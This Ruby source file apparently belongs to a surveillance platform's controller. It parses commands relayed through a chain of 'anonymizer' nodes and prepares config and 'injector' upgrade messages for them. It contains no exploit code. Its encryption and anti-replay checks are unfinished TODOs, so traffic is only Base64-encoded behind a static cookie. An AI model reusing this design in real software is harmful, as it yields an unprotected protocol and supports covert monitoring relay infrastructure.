require 'base64'

require 'rcs-common/trace'

module RCS
  module Controller

    STATUS_OK = 200
    STATUS_SERVER_ERROR = 500

    class ProtocolParser
      include RCS::Tracer

      def initialize(method, uri, content, http)
        @http_method = method
        @http_uri = uri
        @http_content = content
        @http = http
        @anonymizers = DB.instance.collectors
        @chain = parse_chain(@anonymizers)
      end

      def act!

        case @http_method
          when 'PUSH'
            status, content = protocol_push
          when 'POST'
            status, content = protocol_post
        end

        return status, content
      end

      def protocol_push
        # commands sent from the db to be forwarded to the anons

        command = JSON.parse(@http_content)
        trace :debug, "Received command: #{command.inspect}"

        return protocol_send_command(command)
      rescue Exception => e
        trace :error, "Cannot push to anonymizer: #{e.message}"
        trace :fatal, e.backtrace.join("\n")
        return STATUS_SERVER_ERROR, e.message
      end

      def protocol_post

        # receive, check and decrypt a command
        commands = protocol_decrypt(@http[:cookie], @http_content)

        # parse the command
        status, response = protocol_execute_commands(commands)

        # encrypt the command
        response = protocol_encrypt(@http[:cookie], response)

        return status, response
      rescue Exception => e
        trace :error, "Invalid received message: #{e.message}"
        trace :fatal, e.backtrace.join("\n")
        return STATUS_SERVER_ERROR, e.message
      end

      def protocol_decrypt(cookie, blob)
        # check that the cookie is valid and belongs to an anon
        @anon = @anonymizers.select {|x| x['cookie'].eql? cookie}.first
        raise "Invalid received cookie" unless @anon
        trace :info, "Anonymizer '#{@anon['name']}' is sending a command..."

        blob = Base64.decode64(blob)

        # TODO: retrieve the encryption keys and decrypt the blob

        blob = JSON.parse(blob)

        # TODO: anti replay attack

        return blob
      end

      def protocol_encrypt(cookie, command)
        # retrieve the encryption key from the cookie
        @anon = @anonymizers.select {|x| x['cookie'].eql? cookie}.first
        raise "Invalid cookie to send" unless @anon

        command = command.to_json

        # TODO: encrypt the message

        blob = Base64.encode64(command)

        return blob
      end

      def protocol_execute_commands(commands)

        trace :debug, "[#{@anon['name']}] Received command is: #{commands.inspect}"

        # fallback to array if it's a single command
        commands = [commands] unless commands.is_a? Array

        response = []

        # iterate over all the commands
        commands.each do |command|
          case command['command']
            when 'STATUS'
              protocol_status(command, response)
            when 'LOG'
              protocol_log(command, response)
          end
        end

        return STATUS_OK, response
      rescue Exception => e
        return STATUS_SERVER_ERROR, [{command: 'STATUS', result: {status: 'ERROR', msg: e.message}}]
      end

      def protocol_status(command, response)
        params = command['params']
        status = params['status']
        stats = params['stats']
        msg = params['mgs']
        version = params['version']

        # symbolize keys
        stats = stats.inject({}){|h,(k,v)| h.merge({ k.to_sym => v}) }

        name = 'RCS::ANON::' + @anon['name']
        address = @anon['address']

        trace :info, "[NC] [#{name}] #{address} #{status} #{msg}"
        DB.instance.update_status name, address, status, msg, stats, 'anonymizer', version

        response << {command: 'STATUS', result: {status: 'OK'}}
      end

      def protocol_log(command, response)
        params = command['params']
        DB.instance.collector_add_log(@anon['_id'], params['time'], params['type'], params['desc'])
        response << {command: 'LOG', result: {status: 'OK'}}
      end

      def parse_chain(anonymizers)
        trace :debug, "Parsing the anon chains..."

        chain = []

        # find the collector that represent the local instance (find us)
        me = anonymizers.select {|x| x['instance'].eql? DB.instance.local_instance}.first
        # and put it in front of the chain
        chain << me

        # fill the chain with the others
        next_anon = me['next'].first
        until next_anon.eql? nil
          current = anonymizers.select {|x| x['_id'].eql? next_anon}.first
          break unless current
          chain << current
          next_anon = current['next'].first
        end

        trace :info, "Chain is: #{chain.collect {|x| x['name']}.inspect}"

        return chain
      end

      def protocol_send_command(command)
        # retrieve the receiver anon
        receiver = @anonymizers.select{|x| x['_id'].eql? command['anon']}.first
        raise "Cannot send to unknown anon [#{command['anon']}]" unless receiver

        trace :info, "Sending #{command['command']} to '#{receiver['name']}'"

        # prepare the command for the receiver
        case command['command']
          when 'config'
            msg = {command: 'CONFIG', params: {}, body: command['params']}
          when 'upgrade'
            msg = {command: 'UPGRADE', params: {}, body: Base64.encode64(DB.instance.injector_upgrade(receiver['_id']))}
        end

        # TODO calculate the chain to reach the receiver
        msg = protocol_encrypt(receiver['cookie'], msg)

        forward = {command: 'FORWARD', params: {ip: receiver['address'], cookie: receiver['cookie']}, body: msg}

        trace :debug, forward.inspect

        return STATUS_OK, 'OK'
      end
    end

  end
end
